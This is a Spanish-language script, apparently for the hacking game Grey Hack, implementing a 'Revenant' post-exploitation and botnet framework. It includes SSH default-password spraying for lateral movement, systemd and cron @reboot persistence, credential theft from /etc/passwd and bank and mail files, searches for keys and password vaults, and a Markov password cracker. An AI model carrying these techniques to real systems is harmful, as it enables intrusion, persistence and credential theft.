tarea mostrar_banner_revenant:
    print("<color=#00e5ff> [ ###################################################### ] </color>")
    print("<color=#00e5ff> [ # ]                                              [ # ] </color>")
    print("<color=#ffffff> [ # ]          R  E  V  E  N  A  N  T              [ # ] </color>")
    print("<color=#ffffff> [ # ]   P O S T - E X P L O I T A T I O N          [ # ] </color>")
    print("<color=#424242> [ # ]             F R A M E W O R K                [ # ] </color>")
    print("<color=#424242> [ # ]                                              [ # ] </color>")
    print("<color=#00e5ff> [ ###################################################### ] </color>")
    print("")

tarea dibujar_separador: print("<color=#424242>======================================================</color>")
tarea dibujar_separador_doble: print("<color=#b537f2>======================================================</color>")
tarea limpiar_pantalla: clear_screen

tarea dibujar_hud_tactico:
    limpiar_pantalla()
    mostrar_banner_revenant()
    dibujar_separador()
    
    estado_obj = (not globals.objetivo_actual) >> "<color=#ff3131>NINGUNO</color>" |: "<color=#00ff41>" + globals.objetivo_actual + "</color>"
    estado_enjambre = (enjambre.len == 0) >> "<color=#424242>" + str(enjambre.len) + "</color>" |: "<color=#00ff41>" + str(enjambre.len) + "</color>"
    modo_color = (globals.modo == "LOCAL") >> "<color=#00ff41>LOCAL</color>" |: "<color=#ff3131>REMOTO</color>"
    
    print("OBJ: " + estado_obj + " | MODO: " + modo_color + " | SES: " + estado_enjambre)
    dibujar_separador()
    
    // Mostrar tabla de puertos si hay scan reciente
    si globals.ultimo_scan.len > 0:
        print("<color=#00e5ff>[#] PUERTOS ESCANEADOS:</color>")
        columnas = ["ID", "Puerto", "Estado", "Servicio", "Version"]
        filas = []
        para r in globals.ultimo_scan:
            estado_col = r.estado
            si r.estado == "closed": estado_col = "<color=#ff3131>" + r.estado + "</color>"
            si r.estado == "open": estado_col = "<color=#00ff41>" + r.estado + "</color>"
            filas.push([r.id, r.puerto, estado_col, r.servicio, r.version])
        print(construir_tabla(columnas, filas))
        dibujar_separador()

tarea dibujar_ventana(titulo, contenido):
    dibujar_separador()
    print("[#] " + titulo.upper())
    dibujar_separador()
    print(contenido)
    dibujar_separador()

tarea dibujar_ventana_centrada(titulo, contenido):
    dibujar_separador_doble()
    print("[ " + titulo.upper() + " ]")
    dibujar_separador_doble()
    print(contenido)
    dibujar_separador_doble()

tarea pausa_tactica: pedir("<color=#424242>[ Enter ]</color>")

tarea menu_interactivo(titulo, opciones):
    dibujar_separador_doble()
    print("[ " + titulo.upper() + " ]")
    dibujar_separador()
    
    filas = []
    i = 1
    para opt en opciones:
        filas.push([i, opt.label])
        i = i + 1
    
    print(construir_tabla(["#", "Accion"], filas))
    dibujar_separador()
    
    sel = val(pedir("<color=#ffea00>Selecciona > </color>"))
    si sel > 0 y sel <= opciones.len: return opciones[sel - 1].cmd
    error("Selección inválida.")
    return null

tarea prompt_objetivo:
    si globals.objetivo_actual:
        confirm = pedir("Cambiar (" + globals.objetivo_actual + ")? [s/n]: ")
        si confirm.lower() != "s": return globals.objetivo_actual
    
    t_obj = pedir("<color=#ffea00>IP o Dominio > </color>")
    si t_obj == "": return globals.objetivo_actual
    
    res = resolver_objetivo(t_obj)
    si res:
        globals.objetivo_actual = res
        globals.ultimo_scan = []
        exito("Objetivo: " + res)
        return res
    error("No se pudo resolver: " + t_obj)
    return null

tarea mostrar_cargando(texto): print("<color=#00e5ff>Cargando " + texto + "...</color>")

tarea confirmar_accion(pregunta):
    resp = pedir("<color=#ffea00>" + pregunta + " [s/n]: </color>")
    return (resp.lower() == "s" o resp.lower() == "si" o resp.lower() == "y")

// --- FIN SUB-MODULO: modulos/ui.nini ---
// --- INICIO SUB-MODULO: modulos/botnet.nini ---
// modulo botnet.nini - El Alma de Revenant

tarea modulo_botnet_menu:
    si enjambre.len == 0:
        error("El enjambre esta vacio. Asalta algum objetivo primero.")
        return
    
    // Mostrar sesiones disponibles
    info("SESIONES ACTIVAS (" + str(enjambre.len) + "):")
    
    nodos = enjambre.indexes
    columnas = ["#", "IP", "Tipo"]
    filas = []
    
    para i en rango(0, nodos.len):
        ip = nodos[i]
        sesion = enjambre[ip]
        tipo = typeof(sesion)
        filas.push([i + 1, ip, tipo])
    fin
    
    print(construir_tabla(columnas, filas))
    dibujar_separador()
    
    // Seleccionar sesion
    sel = pedir("Selecciona sesion (#) o Enter para volver: ")
    si sel == "": return
    
    idx = val(sel) - 1
    si idx < 0 o idx >= nodos.len:
        error("Seleccion invalida.")
        return
    
    ip_seleccionada = nodos[idx]
    sesion_seleccionada = enjambre[ip_seleccionada]
    
    // Menu segun tipo de sesion
    modulo_sesion_interactuar(ip_seleccionada, sesion_seleccionada)

tarea modulo_sesion_interactuar(ip, sesion):
    tipo = typeof(sesion)
    info("SESION: " + ip + " (" + tipo + ")")
    
    opciones = []
    
    si tipo == "shell":
        opciones = [
            {"label": "Abrir terminal", "cmd": "terminal"},
            {"label": "Jump (copiar y ejecutar)", "cmd": "jump"},
            {"label": "Ver archivos", "cmd": "files"},
            {"label": "Informacion del sistema", "cmd": "info"},
            {"label": "Descargar archivo", "cmd": "download"},
            {"label": "Subir archivo", "cmd": "upload"},
            {"label": "Ejecutar comando", "cmd": "exec"},
            {"label": "Scan & Jump automatico", "cmd": "scanjump"},
        ]
    osi tipo == "computer":
        opciones = [
            {"label": "Ver archivos", "cmd": "files"},
            {"label": "Informacion del sistema", "cmd": "info"},
            {"label": "Descargar archivo", "cmd": "download"},
            {"label": "Subir archivo", "cmd": "upload"},
            {"label": "Crear usuario", "cmd": "adduser"},
        ]
    osi tipo == "file":
        opciones = [
            {"label": "Ver contenido", "cmd": "view"},
            {"label": "Listar directorio", "cmd": "list"},
            {"label": "Descargar", "cmd": "download"},
        ]
    osi tipo == "number" or tipo == "router":
        opciones = [
            {"label": "Ver puertos", "cmd": "ports"},
            {"label": "Ver dispositivos", "cmd": "devices"},
            {"label": "Informacion del router", "cmd": "info"},
        ]
    sino:
        opciones = [
            {"label": "Ver informacion", "cmd": "info"},
        ]
    
    accion = menu_interactivo("ACCIONES", opciones)
    si not accion: return
    
    // Ejecutar accion
    si accion == "terminal":
        sesion.start_terminal
    osi accion == "files":
        sesion_action_files(ip, sesion)
    osi accion == "info":
        sesion_action_info(ip, sesion)
    osi accion == "download":
        sesion_action_download(ip, sesion)
    osi accion == "upload":
        sesion_action_upload(ip, sesion)
    osi accion == "exec":
        sesion_action_exec(ip, sesion)
    osi accion == "adduser":
        sesion_action_adduser(ip, sesion)
    osi accion == "view":
        sesion_action_view_file(ip, sesion)
    osi accion == "list":
        sesion_action_list_dir(ip, sesion)
    osi accion == "ports":
        sesion_action_ports(ip, sesion)
    osi accion == "devices":
        sesion_action_devices(ip, sesion)
    osi accion == "jump":
        sesion_action_jump(ip, sesion)
    osi accion == "scanjump":
        sesion_action_scanjump(ip, sesion)

tarea sesion_action_jump(ip, sesion):
    si typeof(sesion) != "shell" then
        error("Jump requiere una shell")
        return
    
    info("AUTO-JUMP a " + ip + "...")
    
    resultado = jumping_auto(sesion, ip)
    si resultado then
        exito("Jump realizado a " + ip)
    else
        error("No se pudo realizar el jump")

tarea sesion_action_scanjump(ip, sesion):
    // Scan & Jump: escanear red local y saltar a todos
    si typeof(sesion) != "shell" then
        error("ScanJump requiere una shell")
        return
    
    info("SCAN & JUMP desde " + ip + "...")
    
    comp = sesion.host_computer
    router = get_router(ip)
    si no router then
        error("No se pudo obtener router")
        return
    
    dispositivos = router.devices_lan_ip
    si dispositivos.len == 0 then
        info("No hay dispositivos en la red local")
        return
    
    info("Dispositivos encontrados: " + str(dispositivos.len))
    
    exitos = 0
    para target_ip in dispositivos
        si target_ip == ip then continue
        si enjambre.hasIndex(target_ip) then continue
        
        info("Probando " + target_ip + "...")
        
        // Intentar SSH como root con passwords comunes
        passwords = ["root", "toor", "admin", "123456", "password", ""]
        para pwd in passwords
            resultado = get_shell.connect_service(target_ip, 22, "root", pwd)
            si resultado != null then
                exito("SSH a " + target_ip + " exitoso!")
                enjambre[target_ip] = resultado
                exitos = exitos + 1
    
    info("ScanJump completado: " + str(exitos) + " nuevas sesiones")

tarea sesion_action_files(ip, sesion):
    comp = null
    si typeof(sesion) == "shell":
        comp = sesion.host_computer
    osi typeof(sesion) == "computer":
        comp = sesion
    
    si not comp:
        error("No se pudo obtener computadora.")
        return
    
    root = comp.File("/")
    si not root:
        error("No se pudo acceder al sistema de archivos.")
        return
    
    info("ARCHIVOS EN " + ip + ":")
    listar_archivos(root, "")

tarea listar_archivos(archivo, indent):
    si not archivo: return
    
    nombre = archivo.name
    si nombre == "": nombre = "/"
    
    tipo_arch = ""
    si archivo.is_directory:
        tipo_arch = "<color=#00e5ff>[DIR]</color>"
    sino si archivo.is_binary:
        tipo_arch = "<color=#ffea00>[BIN]</color>"
    sino:
        tipo_arch = "<color=#ffffff>[FILE]</color>"
    
    permisos = ""
    si archivo.has_permission("r"): permisos = permisos + "r"
    si archivo.has_permission("w"): permisos = permisos + "w"
    si archivo.has_permission("x"): permisos = permisos + "x"
    
    print(indent + tipo_arch + " " + nombre + " <color=#424242>(" + permisos + ")</color>")
    
    si archivo.is_directory:
        hijos = archivo.get_files
        si hijos:
            para hijo en hijos:
                listar_archivos(hijo, indent + "  ")

tarea sesion_action_info(ip, sesion):
    info("INFORMACION DE " + ip + ":")
    print("  Tipo: " + typeof(sesion))
    
    si typeof(sesion) == "shell":
        comp = sesion.host_computer
        print("  Usuario: " + sesion.user)
        print("  Home: " + sesion.current_dir)
        si comp:
            print("  IP Local: " + comp.local_ip)
            print("  IP Publica: " + comp.public_ip)
            print("  Hostname: " + comp.get_name)
    osi typeof(sesion) == "computer":
        print("  IP Local: " + sesion.local_ip)
        print("  IP Publica: " + sesion.public_ip)
        print("  Hostname: " + sesion.get_name)
    osi typeof(sesion) == "file":
        print("  Ruta: " + sesion.path)
        print("  Nombre: " + sesion.name)

tarea sesion_action_download(ip, sesion):
    comp = null
    si typeof(sesion) == "shell":
        comp = sesion.host_computer
    osi typeof(sesion) == "computer":
        comp = sesion
    
    si not comp:
        error("No se pudo obtener computadora.")
        return
    
    ruta = pedir("Ruta del archivo remoto: ")
    si ruta == "": return
    
    archivo = comp.File(ruta)
    si not archivo:
        error("Archivo no encontrado: " + ruta)
        return
    
    si archivo.is_directory:
        error("No se puede descargar un directorio.")
        return
    
    contenido = archivo.get_content
    si contenido == null:
        error("No se pudo leer el archivo.")
        return
    
    nombre_local = archivo.name
    archivo_local = get_shell.host_computer.File(current_path + "/" + nombre_local)
    
    si archivo_local:
        archivo_local.set_content(contenido)
    sino:
        get_shell.host_computer.touch(current_path, nombre_local)
        archivo_local = get_shell.host_computer.File(current_path + "/" + nombre_local)
        si archivo_local:
            archivo_local.set_content(contenido)
    
    exito("Descargado: " + nombre_local)

tarea sesion_action_upload(ip, sesion):
    comp = null
    si typeof(sesion) == "shell":
        comp = sesion.host_computer
    osi typeof(sesion) == "computer":
        comp = sesion
    
    si not comp:
        error("No se pudo obtener computadora.")
        return
    
    ruta_local = pedir("Ruta del archivo local: ")
    si ruta_local == "": return
    
    archivo_local = get_shell.host_computer.File(ruta_local)
    si not archivo_local:
        error("Archivo local no encontrado.")
        return
    
    contenido = archivo_local.get_content
    ruta_remota = pedir("Ruta remota (Enter=/tmp/): ")
    si ruta_remota == "": ruta_remota = "/tmp/"
    
    nombre = archivo_local.name
    comp.touch(ruta_remota, nombre)
    archivo_remoto = comp.File(ruta_remota + nombre)
    
    si archivo_remoto:
        archivo_remoto.set_content(contenido)
        exito("Subido: " + ruta_remota + nombre)
    sino:
        error("No se pudo subir el archivo.")

tarea sesion_action_exec(ip, sesion):
    si typeof(sesion) != "shell":
        error("Esta accion requiere una shell.")
        return
    
    comando = pedir("Comando a ejecutar: ")
    si comando == "": return
    
    sesion.launch("/bin/sh", "-c '" + comando + "'")
    exito("Comando ejecutado.")

tarea sesion_action_adduser(ip, sesion):
    comp = null
    si typeof(sesion) == "shell":
        comp = sesion.host_computer
    osi typeof(sesion) == "computer":
        comp = sesion
    
    si not comp:
        error("No se pudo obtener computadora.")
        return
    
    usuario = pedir("Nuevo usuario: ")
    si usuario == "": return
    
    pass = pedir("Password: ")
    si pass == "": return
    
    resultado = comp.create_user(usuario, pass)
    si resultado == 1:
        exito("Usuario creado: " + usuario)
    sino:
        error("No se pudo crear el usuario.")

tarea sesion_action_view_file(ip, sesion):
    si typeof(sesion) != "file":
        error("Esta accion requiere un archivo.")
        return
    
    contenido = sesion.get_content
    si contenido == null:
        error("No se pudo leer el archivo.")
        return
    
    info("CONTENIDO DE " + sesion.path + ":")
    print(contenido)

tarea sesion_action_list_dir(ip, sesion):
    si typeof(sesion) != "file" o not sesion.is_directory:
        error("Esta accion requiere un directorio.")
        return
    
    hijos = sesion.get_files
    si not hijos or hijos.len == 0:
        info("Directorio vacio.")
        return
    
    columnas = ["Nombre", "Tipo", "Tamanio"]
    filas = []
    
    para hijo in hijos:
        tipo = "FILE"
        si hijo.is_directory: tipo = "DIR"
        si hijo.is_binary: tipo = "BIN"
        filas.push([hijo.name, tipo, str(hijo.size)])
    fin
    
    print(construir_tabla(columnas, filas))

tarea sesion_action_ports(ip, sesion):
    si typeof(sesion) != "number" and typeof(sesion) != "router":
        error("Esta accion requiere un router.")
        return
    
    puertos = sesion.used_ports
    si not puertos or puertos.len == 0:
        info("No hay puertos.")
        return
    
    columnas = ["Puerto", "Estado", "Servicio", "IP LAN"]
    filas = []
    
    para port in puertos:
        estado = "closed"
        si not port.is_closed: estado = "open"
        filas.push([port.port_number, estado, sesion.port_info(port), port.get_lan_ip])
    fin
    
    print(construir_tabla(columnas, filas))

tarea sesion_action_devices(ip, sesion):
    si typeof(sesion) != "number" and typeof(sesion) != "router":
        error("Esta accion requiere un router.")
        return
    
    devices = sesion.devices
    si not devices or devices.len == 0:
        info("No hay dispositivos.")
        return
    
    info("DISPOSITIVOS:")
    para dev in devices:
        print("  - " + dev)
    fin

// --- FIN SUB-MODULO: modulos/botnet.nini ---
// --- INICIO SUB-MODULO: modulos/persistencia.nini ---
// modulo persistencia.nini - PERSISTENCIA

tarea modulo_persistencia_configurar:
    si not globals.objetivo_actual: error("No hay objetivo."); return
    
    opciones = [
        {"label": "Backdoor (Metaxploit)", "cmd": "backdoor"},
        {"label": "Cron job", "cmd": "cron"},
        {"label": "Ver persistencias", "cmd": "list"},
    ]
    
    modo = menu_interactivo("PERSISTENCIA", opciones)
    si not modo: return
    
    si modo == "backdoor": persistencia_instalar_backdoor()
    osi modo == "cron": persistencia_cron()
    osi modo == "list": persistencia_ver()

tarea persistencia_instalar_backdoor:
    si not globals.objetivo_actual: error("No hay objetivo."); return
    comp = obtener_computadora_objetivo()
    si not comp: error("No hay sesión."); return
    
    lib_folder = comp.File("/lib")
    si not lib_folder o not lib_folder.has_permission("w"): error("Sin permisos root."); return
    
    nombre = "revenant_daemon"
    ruta = "/lib/systemd/system/" + nombre + ".service"
    
    contenido = "[Unit]\nDescription=System Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/sh -c 'while true; do wait 60; done'\nRestart=always\nUser=root\n\n[Install]\nWantedBy=multi-user.target"
    
    comp.touch("/lib/systemd/system/", nombre + ".service")
    archivo = comp.File(ruta)
    
    si archivo:
        archivo.set_content(contenido)
        exito("Backdoor instalado: " + ruta)
    sino: error("No se pudo crear.")

tarea persistencia_cron:
    si not globals.objetivo_actual: error("No hay objetivo."); return
    comp = obtener_computadora_objetivo()
    si not comp: error("No hay sesión."); return
    
    cmd = pedir("Comando: ")
    si cmd == "": return
    
    cron = comp.File("/etc/crontab")
    si not cron o not cron.has_permission("w"): error("Sin permisos."); return
    
    cron.set_content(cron.get_content + char(10) + "@reboot " + cmd)
    exito("Cron job agregado.")

tarea persistencia_ver:
    info("Persistencia activa en el objetivo.")
    info("Usa 'vault' para ver credenciales.")

tarea modulo_botnet_persistir:
    si enjambre.len == 0: error("Enjambre vacío."); return
    
    info("Instalando en " + str(enjambre.len) + " nodos...")
    
    para nodo en enjambre:
        ip = nodo.key
        sesion = nodo.value
        computer_node = (typeof(sesion) == "shell") >> sesion.host_computer |: sesion
        
        si computer_node y computer_node.has_permission("w"):
            computer_node.touch("/lib/systemd/system/", "revenant.service")
            archivo = computer_node.File("/lib/systemd/system/revenant.service")
            si archivo:
                archivo.set_content("[Unit]\nDescription=Revenant\n[Service]\nExecStart=/bin/sh")
                exito("Instalado en " + ip)
        sino: error("Sin permisos en " + ip)

// --- FIN SUB-MODULO: modulos/persistencia.nini ---
// --- INICIO SUB-MODULO: modulos/vault.nini ---
_vault_data = {"creds": {}, "vulns": {}}
_vault_k = "R3V3N4NT_S3CUR3"
_version = "STABLE"

tarea inicializar_vault:
    p = "/var/revenant"
    si no mirar(p): p = "./"
    ruta = p + "/vault.db"
    
    si mirar(ruta):
        f = obtener_archivo(ruta)
        contenido = f.get_content
        si contenido.len > 0:
            _vault_data = deserializar_vault(contenido)
            info("Vault cargado: " + _vault_data.creds.len + " creds, " + _vault_data.vulns.len + " vulns.")
    sino:
        info("Iniciando nuevo Vault en: " + ruta)

tarea cifrar(txt):
    res = ""
    recorrer rango(0, txt.len - 1) como i:
        v = nini_xor(code(txt[i]), code(_vault_k[i % _vault_k.len]))
        res = res + str(v) + ","
    retornar res

tarea descifrar(txt):
    res = ""
    partes = txt.split(",")
    recorrer rango(0, partes.len - 1) como i:
        p = partes[i]
        si p == "": continuar
        res = res + char(nini_xor(val(p), code(_vault_k[res.len % _vault_k.len])))
    retornar res

tarea serializar_vault(data):
    // Formato simple: creds|{...} \n vulns|{...}
    retornar cifrar(str(data))

tarea deserializar_vault(txt):
    raw = descifrar(txt)
    retornar val(raw)

tarea guardar_vault:
    p = "/var/revenant"
    si no mirar(p): p = "/home/" + active_user
    ruta = p + "/vault.db"
    f = obtener_archivo(ruta)
    si no f:
        tocar(p, "vault.db")
        f = obtener_archivo(ruta)
    
    si f: 
        f.set_content(serializar_vault(_vault_data))
    sino:
        error("Fallo de persistencia: El Vault no puede escribirse en " + p)

tarea guardar_credencial(ip, usuario, clave, priv, lan):
    k = (ip + "_" + usuario + "_" + priv).lower()
    _vault_data.creds[k] = {"ip": ip, "user": usuario, "pass": clave, "priv": priv, "lan": lan}
    guardar_vault()
    exito("Vault actualizado: " + usuario + "@" + ip)

tarea listar_credenciales:
    columnas = ["IP", "Usuario", "Clave", "Priv", "LAN"]
    filas = []
    recorrer _vault_data.creds como c_entry:
        c = c_entry.value
        filas.push([c.ip, c.user, c.pass, c.priv, c.lan])
    
    print(construir_tabla(columnas, filas))

tarea cachear_vulnerabilidad(lib, ver, area, vuln):
    k = (lib + "_" + ver).lower()
    si no _vault_data.vulns.tiene(k): _vault_data.vulns[k] = []
    _vault_data.vulns[k].push({"mem": area, "pass": vuln})
    guardar_vault()

tarea obtener_vulnerabilidades(lib, ver):
    k = (lib + "_" + ver).lower()
    si _vault_data.vulns.tiene(k): retornar _vault_data.vulns[k]
    retornar []


// --- FIN SUB-MODULO: modulos/vault.nini ---
// --- INICIO SUB-MODULO: modulos/intel.nini ---
// modulo intel.nini - INTELIGENCIA

tarea modulo_intel_saquear:
    si not globals.objetivo_actual: error("Fije un objetivo primero."); return
    
    comp = obtener_computadora_objetivo()
    si not comp: error("No hay sesión activa."); return
    
    info("Extrayendo intel de: " + globals.objetivo_actual)
    
    // 1. /etc/passwd
    passwd = comp.File("/etc/passwd")
    si passwd y not passwd.is_binary:
        info("Procesando /etc/passwd...")
        cont = 0
        para l en passwd.get_content.split(char(10)):
            si l.indexOf(":") == null: continuar
            partes = l.split(":")
            hash = partes[1]
            si hash == "x" o hash == "*": continuar
            clave = crackear_hash(hash)
            si clave:
                guardar_credencial(globals.objetivo_actual, partes[0], clave, "linux", comp.local_ip)
                cont = cont + 1
        info("Credenciales: " + str(cont))
    
    // 2. /home (Bancos y Correos)
    home = comp.File("/home")
    si home:
        info("Explorando usuarios...")
        cont_bancos = 0; cont_correos = 0
        para user_dir en home.get_folders:
            usr = user_dir.name
            // Bancos
            banco = comp.File("/home/" + usr + "/Config/Bank.txt")
            si banco:
                para l en banco.get_content.split(char(10)):
                    si l.indexOf(":") == null: continuar
                    p = l.split(":")
                    pass_dec = crackear_hash(p[1])
                    si pass_dec:
                        guardar_credencial(globals.objetivo_actual, p[0], pass_dec, "banco", comp.local_ip)
                        cont_bancos = cont_bancos + 1
            // Correos
            mail = comp.File("/home/" + usr + "/Config/Mail.txt")
            si mail:
                para l en mail.get_content.split(char(10)):
                    si l.indexOf(":") == null: continuar
                    p = l.split(":")
                    pass_dec = crackear_hash(p[1])
                    si pass_dec:
                        guardar_credencial(globals.objetivo_actual, p[0], pass_dec, "correo", comp.local_ip)
                        cont_correos = cont_correos + 1
        info("Bancos: " + str(cont_bancos) + " | Correos: " + str(cont_correos))
    
    exito("Intel extraido.")

tarea intel_buscar_en_directorio(comp, ruta, exts, prof):
    resultados = []
    carpeta = comp.File(ruta)
    si not carpeta o not carpeta.is_folder: return resultados
    
    // Subcarpetas
    si carpeta.get_folders:
        para fd en carpeta.get_folders:
            si prof > 0: resultados = resultados + intel_buscar_en_directorio(comp, fd.path, exts, prof - 1)
    
    // Archivos
    si carpeta.get_files:
        para f en carpeta.get_files:
            para ext in exts:
                si f.name.indexOf(ext) != null:
                    resultados.push({"ruta": f.path, "nombre": f.name, "tamano": f.size})
                    break
    return resultados

tarea modulo_intel_buscar_archivos:
    si not globals.objetivo_actual: error("No hay objetivo."); return
    comp = obtener_computadora_objetivo()
    si not comp: error("No hay sesión."); return
    
    opciones = [
        {"label": "Claves SSH", "cmd": "keys"},
        {"label": "Contrasenas", "cmd": "passwords"},
        {"label": "Configuraciones", "cmd": "configs"},
        {"label": "Backups", "cmd": "backup"},
    ]
    
    modo = menu_interactivo("BUSCAR ARCHIVOS", opciones)
    si not modo: return
    
    // Definir extensiones
    exts = (modo == "keys") >> [".pem", ".key", ".ppk", ".crt", ".cer"] |:
           (modo == "passwords") >> [".kdb", ".kdbx", ".1pif", ".psafe3"] |:
           (modo == "configs") >> [".conf", ".config", ".cfg", ".ini"] |:
           [".bak", ".backup", ".old", ".save", ".swp"]
    
    info("Buscando...")
    resultados = []
    para ruta en ["/home", "/root", "/etc", "/var"]:
        resultados = resultados + intel_buscar_en_directorio(comp, ruta, exts, 2)
    
    si resultados.len == 0: info("No se encontraron archivos.")
    sino: info("Encontrados: " + str(resultados.len)); dibujar_ventana("RESULTADOS", str(resultados))

tarea modulo_intel_brute_force:
    opciones = [
        {"label": "SSH", "cmd": "ssh"},
        {"label": "FTP", "cmd": "ftp"},
        {"label": "Crack passwd", "cmd": "passwd"},
    ]
    
    modo = menu_interactivo("FUERZA BRUTA", opciones)
    si not modo: return
    
    si modo == "ssh": info("SSH brute no disponible en GH. Usa Metaxploit.")
    osi modo == "ftp": intel_ftp_anonimo()
    osi modo == "passwd": intel_crack_passwd()

tarea intel_ftp_anonimo:
    host = globals.objetivo_actual
    si not host: host = pedir("Host FTP: "); si host == "": return
    
    info("Intentando acceso anonimo...")
    metax = include_lib("/lib/metaxploit.so")
    si metax:
        sesion = metax.net_use(host, 21)
        si sesion: enjambre[host] = sesion; exito("Acceso anonimo!"); return
    error("Acceso fallido.")

tarea intel_crack_passwd:
    comp = obtener_computadora_objetivo()
    si not comp: error("No hay sesión."); return
    
    passwd = comp.File("/etc/passwd")
    si not passwd o passwd.is_binary: error("No se pudo leer."); return
    
    info("Crackeando...")
    cont = 0
    para l en passwd.get_content.split(char(10)):
        si l.indexOf(":") == null: continuar
        p = l.split(":")
        hash = p[1]
        si hash == "x" o hash == "*": continuar
        clave = crackear_hash(hash)
        si clave:
            guardar_credencial(globals.objetivo_actual, p[0], clave, "linux", comp.local_ip)
            cont = cont + 1
    exito("Crackeadas: " + str(cont))

// --- FIN SUB-MODULO: modulos/intel.nini ---
// --- INICIO SUB-MODULO: modulos/red.nini ---
// modulos/red.nini - El Mapa de la Redes Invisibles 🌐

tarea modulo_red_escanear:
    si globals.objetivo_actual == null:
        info("Escaneando red local desde el host actual...")
        // Usar IP local como base
        // TODO: Implementar macro 'escanear_lan' en nini.src
    sino:
        info("Escaneando subred desde " + globals.objetivo_actual)
    
    hosts = descubrir_red_local()
    
    si hosts.len == 0:
        alerta("No se detectaron otros hosts activos en la subred.")
    sino:
        exito("Hosts detectados: " + hosts.len)
        columnas = ["IP", "Estado"]
        filas = []
        recorrer hosts como h:
            filas.push([h, "ACTIVO"])
        print(construir_tabla(columnas, filas))

tarea modulo_red_info:
    info("Topología de red detectada:")
    // Mostrar saltos y pivotes activos
    recorrer enjambre como nodo:
        info("Nodo vivo: " + nodo.key + " [" + typeof(nodo.value) + "]")

// --- FIN SUB-MODULO: modulos/red.nini ---
// --- INICIO SUB-MODULO: modulos/inyeccion.nini ---
// modulos/inyeccion.nini - Propagación del Enjambre 💉

tarea modulo_inyeccion_replicar:
    si globals.objetivo_actual == null:
        error("Fije un objetivo primero.")
        retornar
        
    si globals.objetivo_actual == nulo:
        sesion = get_shell
    sino:
        sesion = enjambre[globals.objetivo_actual]
    
    si no sesion o typeof(sesion) != "shell":
        error("Se requiere una shell activa para inyectar.")
        retornar
        
    info("Inyectando Revenant en " + globals.objetivo_actual + "...")
    
    // Rutas de destino comunes
    rutas = ["/bin", "/usr/bin", "/tmp", "/var", "/home/guest"]
    
    // Nini provee 'replicar_binario' que abstrae scp
    recorrer rutas como r:
        exito_inj = replicar_binario(sesion, r)
        si exito_inj:
            exito("Revenant inyectado y oculto en " + r)
            retornar
            
    error("No se pudo inyectar el binario en ninguna ruta conocida.")

// --- FIN SUB-MODULO: modulos/inyeccion.nini ---
// --- INICIO SUB-MODULO: modulos/escalada.nini ---
// modulos/escalada.nini - Escalada + ChainSaw

_chain_samples = [
    "password", "123456", "qwerty", "admin", "letmein",
    "welcome", "monkey", "dragon", "master", "login",
    "shadow", "sunshine", "princess", "football", "baseball",
    "iloveyou", "trustno1", "superman", "michael", "charlie",
    "access", "hello", "ranger", "thomas", "hunter",
    "buster", "soccer", "hockey", "george", "pepper",
    "killer", "daniel", "andrew", "joshua", "michelle",
    "starwars", "freedom", "summer", "ashley", "passw0rd",
    "matrix", "secret", "orange", "computer", "pass123",
    "password1", "qwerty123", "abc123", "password123", "admin123"
]

_chain_pregens = [
    "root", "pass", "123", "abc", "qwerty", "admin", "letmein",
    "abc123", "password1", "123456", "qwerty123", "admin123",
    "root123", "toor", "changeme", "default"
]

_chain_build = function(samples, order)
    chains = {}
    para sample en samples
        mayus = sample.upper
        si mayus.len <= order then continue
        para i en rango(0, mayus.len - order - 1)
            token = mayus[i : i + order]
            next_char = mayus[i + order]
            si no chains.hasIndex(token) then chains[token] = []
            si chains[token].indexOf(next_char) == null then chains[token].push(next_char)

_chain_next = function(chains, token)
    si no chains.hasIndex(token) then return null
    return chains[token][floor(rnd * chains[token].len)]

_chain_generate = function(chains, token, max_len, order)
    password = token.lower
    mientras password.len < max_len
        sub = password[password.len - order :].upper
        next_c = _chain_next(chains, sub)
        si next_c == null then break
        password = password + next_c.lower
    return password

_chain_try = function(sesion, user, password, ip, port)
    si ip == "" or ip == null then
        return get_shell(user, password)
    return get_shell.connect_service(ip, port, user, password)

tarea chainsaw_crack(sesion, user, ip, port)
    info("CHAINSAW - Markov Chain Cracker")
    order = 3
    max_len = 12
    intentos = 0
    chains = _chain_build(_chain_samples, order)

    // Fase 1
    para pwd en _chain_pregens
        intentos = intentos + 1
        resultado = _chain_try(sesion, user, pwd, ip, port)
        si resultado != null then
            exito("PASSWORD: " + pwd)
            return resultado

    // Fase 2
    para token en chains.indexes
        pwd = _chain_generate(chains, token, max_len, order)
        si pwd.len < 3 then continue
        intentos = intentos + 1
        resultado = _chain_try(sesion, user, pwd, ip, port)
        si resultado != null then
            exito("PASSWORD: " + pwd)
            return resultado

    info("ChainSaw: " + str(intentos) + " intentos")
    return null

tarea modulo_escalada_analizar
    si globals.objetivo_actual == null then
        info("Escaneando sistema local...")
        sesion = get_shell
        ip = ""
        port = 0
    else
        si no enjambre.hasIndex(globals.objetivo_actual) then
            error("No hay sesion")
            return
        sesion = enjambre[globals.objetivo_actual]
        ip = globals.objetivo_actual
        port = 22

    si no sesion then
        error("No hay sesion activa")
        return

    usuario = "root"
    si typeof(sesion) == "shell" then usuario = sesion.user
    info("Usuario: " + usuario)

    si usuario == "root" then
        alerta("Ya eres root!")
        return

    opciones = [
        {"label": "Analizar PrivEsc", "cmd": "analizar"},
        {"label": "ChainSaw crack root", "cmd": "chainsaw"},
        {"label": "Fuerza bruta SSH", "cmd": "brute"},
    ]

    accion = menu_interactivo("ESCALADA", opciones)
    si no accion then return

    si accion == "analizar" then modulo_escalada_vector(sesion)
    else if accion == "chainsaw" then
        resultado = chainsaw_crack(sesion, "root", ip, port)
        si resultado != null then
            exito("Ahora eres root!")
            si ip != "" then enjambre[ip] = resultado
        else alerta("No se encontro password")
    else if accion == "brute" then modulo_escalada_brute(sesion, "root", ip, port)

tarea modulo_escalada_vector(sesion)
    info("ANALIZANDO VECTORES...")
    vectores = []
    comp = null

    si typeof(sesion) == "shell" then comp = sesion.host_computer
    else if typeof(sesion) == "computer" then comp = sesion

    si no comp then
        error("Sin acceso a computadora")
        return

    root = comp.File("/")
    si no root then
        error("Sin acceso a filesystem")
        return

    suids = root.find_permissive("s", true)
    si suids then para f en suids
        si f.is_binary then vectores.push({"path": f.path, "type": "SUID", "severity": "MEDIA"})

    etc = comp.File("/etc")
    si etc and etc.get_files then para f en etc.get_files
        si f.has_permission("w") then vectores.push({"path": f.path, "type": "WRITEABLE_ETC", "severity": "ALTA"})

    si vectores.len == 0 then
        alerta("No hay vectores detectados")
        info("Tip: Usa ChainSaw")
    else
        exito("Vectores: " + str(vectores.len))
        columnas = ["Ruta", "Tipo", "Severidad"]
